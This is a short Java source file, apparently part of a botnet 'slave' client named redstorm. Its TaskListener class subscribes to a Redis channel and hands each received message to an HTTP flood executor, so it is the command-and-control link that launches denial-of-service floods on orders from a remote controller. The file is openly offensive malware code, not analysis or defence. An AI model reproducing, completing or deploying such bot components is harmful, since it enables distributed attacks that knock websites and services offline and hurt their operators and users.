package dev.mrflyn.redstorm_slave.listeners;

import dev.mrflyn.redstorm_slave.HttpFloodExecutor;
import redis.clients.jedis.JedisPubSub;

import static dev.mrflyn.redstorm_slave.Main.TASK_CHANNEL;


public class TaskListener extends JedisPubSub {
    @Override
    public void onMessage(String channel, String message) {
        if (TASK_CHANNEL.equals(channel)) {
            System.out.println("Received task: " + message);
            HttpFloodExecutor.executeHttpFlood(message);
        }
    }
}
